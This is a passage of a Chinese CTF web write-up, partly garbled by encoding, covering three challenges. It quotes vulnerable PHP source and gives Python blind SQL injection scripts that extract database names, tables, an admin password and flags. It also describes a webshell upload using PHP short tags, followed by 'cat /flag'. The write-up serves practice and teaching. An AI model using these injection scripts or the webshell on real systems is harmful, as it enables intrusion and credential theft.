class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$email</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\_|\+|\=|\]|\;|\'|\â€™|\â€œ|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\_|\+|\=|\]|\;|\'|\â€™|\â€œ|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\-|\_|\+|\=|\&#123;|\&#125;\]|\'|\â€™|\â€œ|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\-|\_|\+|\=|\&#123;|\&#125;|\]|\;|\'|\â€™|\â€œ|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$email</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO user (uname, pwd, email,nname) VALUES ('<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$password</span></span>', '<span class="token interpolation"><span class="token variable">$email</span></span>','<span class="token interpolation"><span class="token variable">$nickname</span></span>')"</span><span class="token punctuation">;</span>            <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>user_main.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CTFshow_web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">..........<span class="token punctuation">(</span>css<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token variable">$order</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\â€™|\â€œ|\"|\&lt;|\>|\?|\,|\.|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by <span class="token interpolation"><span class="token variable">$order</span></span>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by id"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>   <span class="token delimiter important">?></span></span>..........(html)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¯ä¼ å…¥çš„å€¼éƒ½ç»è¿‡äº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¤§å¤šæ•°ç‰¹æ®Šç¬¦å·éƒ½è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥è¿›è¡Œsqlæ³¨å…¥æ˜¾ç„¶ä¸å¯èƒ½ï¼Œå¯»æ‰¾å…¶ä»–çš„å…¥æ‰‹ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨<code>user_main.php</code>çš„ä¼ å…¥çš„<code>order</code>å€¼å¤„ï¼Œæœ‰ä¸€æ¡<code>order by</code>è¯­å¥ï¼Œæ˜¯ç”¨æ¥æ ¹æ®<code>order by</code>åé¢çš„åˆ—æ¥è¿›è¡Œæ’åºçš„ï¼Œæ ¹æ®é¢˜ç›®æç¤º<code>flag_is_my_password</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¾—åˆ°ç”¨æˆ·<code>flag</code>çš„å¯†ç å³å¯ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ ¹æ®<code>pwd</code>çš„å€¼æ¥æ’åºï¼Œç„¶åé…åˆç›²æ³¨å¾—å‡º<code>flag</code>ï¼Œæˆ‘ä»¬æ³¨å†Œä¸åŒå¯†ç çš„è´¦å·ï¼ŒåŸç†å‡è®¾å¯†ç ä¸º<code>e</code>ï¼ˆå‰ç«¯æœ‰ä¸ª<code>md5</code>åŠ å¯†æŠ“åŒ…å¯ä»¥ç›´æ¥ç»•è¿‡ä¸å½±å“ï¼‰ï¼Œå¦‚æœ<code>flag</code>çš„å¯†ç ä¸º<code>flag&#123;xxxxx&#125;</code>é‚£ä¹ˆ<code>e</code>&lt;<code>flag&#123;xxxxx&#125;</code>ï¼Œå†ä¼ å…¥<code>user_main.php?order=pwd</code>ï¼Œé‚£ä¹ˆå¯†ç ä¸º<code>e</code>çš„è¿™ä¸€è¡Œå°±åœ¨flagè¿™ä¸€è¡Œçš„ä¸Šé¢ã€‚è€Œå¦‚æœæ³¨å†Œä¸€ä¸ªå¯†ç ä¸º<code>g</code>çš„ç”¨æˆ·ï¼Œåˆ™å¯†ç ä¸º<code>g</code>çš„ç”¨æˆ·çš„è¿™ä¸€è¡Œåˆ™ä¼šåœ¨<code>flag</code>è¿™ä¸€è¡Œçš„ä¸‹é¢ï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿æ¥è¿›è¡Œç›²æ³¨æ¯”è¾ƒå¾—å‡º<code>flag</code>çš„æ‰€æœ‰å€¼</p><p>exp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show"</span>urlreg <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/reg.php"</span>  <span class="token comment">#æ³¨å†Œ å¿…é¡»è¦æ˜¯å¯ä¼ å‚phpæ–‡ä»¶</span>urllogin <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>  <span class="token comment">#ç™»å½• å¿…é¡»è¦æ˜¯å¯ä¼ å‚phpæ–‡ä»¶</span>urlorder <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/user_main.php?order=pwd"</span>  <span class="token comment"># æ˜¾ç¤º</span>s <span class="token operator">=</span> <span class="token string">"-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span>  <span class="token comment"># æŒ‰ç…§asciiç è¡¨çš„å­—ç¬¦ä¸²å¤§å°æ’åº</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>        exp <span class="token operator">=</span> <span class="token string">""</span>        exp <span class="token operator">=</span> flag <span class="token operator">+</span> j        datereg <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>exp<span class="token punctuation">,</span>  <span class="token comment"># ä»”ç»†è§‚å¯Ÿusernameå’Œpasswordå¹¶æ²¡æœ‰å¯¹-å’Œ&#123;&#125;è¿›è¡Œè¿‡æ»¤</span>            <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"zzz"</span><span class="token punctuation">,</span>            <span class="token string">"nickname"</span><span class="token punctuation">:</span><span class="token string">"zzz"</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span>exp        <span class="token punctuation">&#125;</span>        datelogin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>exp<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span>exp        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># å½“æ³¨å†Œçš„ç”¨æˆ·åå­—ä¸ºflagçš„æ—¶å€™ï¼Œå› ä¸ºå·²ç»å­˜åœ¨flagç”¨æˆ·åœ¨ï¼Œé¢ç›´æ¥æ‰“å°flagè·³è¿‡åé¢çš„è¯­å¥çš„æ‰§è¡Œ</span>            flag <span class="token operator">=</span> <span class="token string">'flag'</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ä¿æŒä¼šè¯</span>        reg <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urlreg<span class="token punctuation">,</span> datereg<span class="token punctuation">)</span>        login <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urllogin<span class="token punctuation">,</span> datelogin<span class="token punctuation">)</span>        a <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlorder<span class="token punctuation">)</span>        txt <span class="token operator">=</span> a<span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token punctuation">(</span>txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>exp<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span><span class="token operator">></span>txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># indexè¿”å›å­—ç¬¦ä¸²è¢«æ‰¾åˆ°åˆ°æœ€å°çš„ç´¢å¼•ï¼ˆæœ€å·¦ï¼‰</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment"># å¾—åˆ°çš„å­—ç¬¦ä¸ºæ¯”flagçš„å•ä¸ªå­—ç¬¦çš„å€¼å¤§1ï¼Œæ‰€ä»¥éœ€è¦-1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>æœ€ç»ˆå¾—åˆ°åˆ°flag</p><h3 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"></a>CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb</h3><p>robots.txtå†…å®¹å¦‚ä¸‹</p><pre class="language-none"><code class="language-none">User-agent: *Disallow: *.php.bak</code></pre><p>äºæ˜¯æ‰¾<code>.bak</code>æ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨image.php.bakï¼Œä¸‹è½½ä¸‹æ¥åå¾—åˆ°image.phpçš„æºç å¦‚ä¸‹:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select * from images where id='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>' or path='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$path</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼Œé€šè¿‡ä¼ å…¥idä¸º<code>\\0</code>æ¥è½¬ä¹‰idåé¢çš„å¼•å·ï¼Œä¸pathå‰é¢çš„å¼•å·é—­åˆå¯¼è‡´sqlæ³¨å…¥</p><p>expå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://a371750a-b2b0-4f95-9c4f-c2cf5292c17c.node3.buuoj.cn/image.php"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select database()),&#123;&#125;,1))?&#123;&#125;,1,0)--+</span><span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))>&#123;&#125;,1,0)--+  images,users</span><span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=database()),&#123;&#125;,1))>&#123;&#125;,1,0)--+  username,password</span><span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))>&#123;&#125;,1,0)--+   8e97f11c1585e0f6dedb</span><span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(username) from users),&#123;&#125;,1))>&#123;&#125;,1,0)--+   admin</span>payload <span class="token operator">=</span> <span class="token string">"?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))>&#123;&#125;,1,0)--+"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        <span class="token comment"># print(url + payloads)</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payloads<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'JFIF'</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°adminçš„å¯†ç ç™»å½•åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ—¥å¿—å¹¶ä¸”å‘Šè¯‰äº†æˆ‘ä»¬è·¯å¾„ä¸”åç¼€ä¸ºphpæ–‡ä»¶ï¼Œä¸Šä¼ åæ‰“å¼€ç•Œé¢ä¼šæ˜¾ç¤ºæ–‡ä»¶çš„åå­—ï¼Œäºæ˜¯æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œä¸Šä¼ åphpå°±ä¼šè§£æè¿™ä¸ªé¡µé¢é‡Œçš„phpè¯­æ³•ï¼Œä½†æ˜¯æ–‡ä»¶åå­—ä¸èƒ½æœ‰phpåœ¨é‡Œé¢ï¼Œäºæ˜¯å°±éœ€è¦ä¸€å¥è¯çš„çŸ­æ ‡ç­¾ç‰ˆï¼Œå‰æéœ€è¦PHPå¼€å¯çŸ­æ ‡ç­¾å³<code>short_open_tag=on</code>ï¼Œé¢˜ç›®æ”¯æŒï¼Œéšå<code>cat /flag</code>å³å¯</p><h3 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h3><p><code>if(1=1,1,2)</code>æµ‹è¯•æœ‰å›æ˜¾ï¼Œäºæ˜¯å†™è„šæœ¬çˆ†ç ´</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://228a1e37-3bc0-4272-ac01-c99d47dfd854.node3.buuoj.cn/?stunum="</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># if(ascii(mid((select/**/database()),&#123;&#125;,1))>&#123;&#125;,1,2)    ctf</span><span class="token comment"># if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))>&#123;&#125;,1,2)     flag,score</span><span class="token comment"># if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),&#123;&#125;,1))>&#123;&#125;,1,2)         flag,value</span><span class="token comment"># if(ascii(mid((select/**/value/**/from/**/flag),&#123;&#125;,1))>&#123;&#125;,1,2)</span>payload <span class="token operator">=</span> <span class="token string">"if(ascii(mid((select/**/value/**/from/**/flag),&#123;&#125;,1))>&#123;&#125;,1,2)"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payloads<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token 